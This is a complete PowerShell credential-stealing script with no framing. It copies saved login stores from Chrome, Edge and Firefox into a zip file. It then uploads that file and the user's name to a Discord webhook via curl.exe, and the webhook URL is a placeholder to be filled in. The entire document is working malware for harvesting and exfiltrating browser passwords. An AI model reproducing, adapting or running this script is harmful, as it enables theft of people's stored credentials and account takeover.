function Collect-Credentials {
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $firefoxLoginData = "$firefoxProfilePath\*\logins.json"
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $outputPath = "C:\temp\credential.zip"  # Update the output path to C:\temp

    # Create a temporary directory to store the login data files
    $tempDir = New-Item -ItemType Directory -Path (Join-Path $env:TEMP "CredentialTemp") -Force

    try {
        # Copy Chrome login data
        Copy-Item -Path $chromeLoginData -Destination $tempDir.FullName -Force -ErrorAction Stop

        # Copy Edge login data
        Copy-Item -Path $edgeLoginData -Destination $tempDir.FullName -Force -ErrorAction Stop

        # Check if Firefox profiles directory exists
        if (Test-Path -Path $firefoxProfilePath) {
            # Copy Firefox login data
            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
            foreach ($profile in $firefoxProfiles) {
                $loginDataPath = Join-Path $profile.FullName "logins.json"
                if (Test-Path -Path $loginDataPath) {
                    Copy-Item -Path $loginDataPath -Destination $tempDir.FullName -Force -ErrorAction Stop
                }
            }
        }
        else {
            Write-Host "Firefox profiles directory not found. Skipping Firefox credentials collection." -ForegroundColor Yellow
        }

        # Delete existing zip file if it exists
        if (Test-Path -Path $outputPath -PathType Leaf) {
            Remove-Item -Path $outputPath -Force
        }

        # Zip the collected login data
        Write-Host "Zipping the collected login data..."
        Compress-Archive -Path $tempDir\* -DestinationPath $outputPath -Force

        Write-Host "Credentials collected and zipped successfully at: $outputPath"

        # Return the path to the zip file
        $outputPath
    }
    catch {
        Write-Host "An error occurred while collecting credentials: $_" -ForegroundColor Red
    }
    finally {
        # Clean up the temporary directory
        Remove-Item -Path $tempDir.FullName -Recurse -Force
    }
}

# Call the function to collect and zip the credentials, and store the output path
$zipFilePath = Collect-Credentials

$webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN"  # Replace with your Discord webhook URL
$fileToUpload = 'C:\temp\credential.zip'

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = $webhookUrl

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Upload the file to Discord using curl.exe
    if (-not ([string]::IsNullOrEmpty($file))) {
        $curlArgs = "-F", "file1=@$file"
        & curl.exe $curlArgs $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($fileToUpload))) {
    Upload-Discord -file $fileToUpload
}
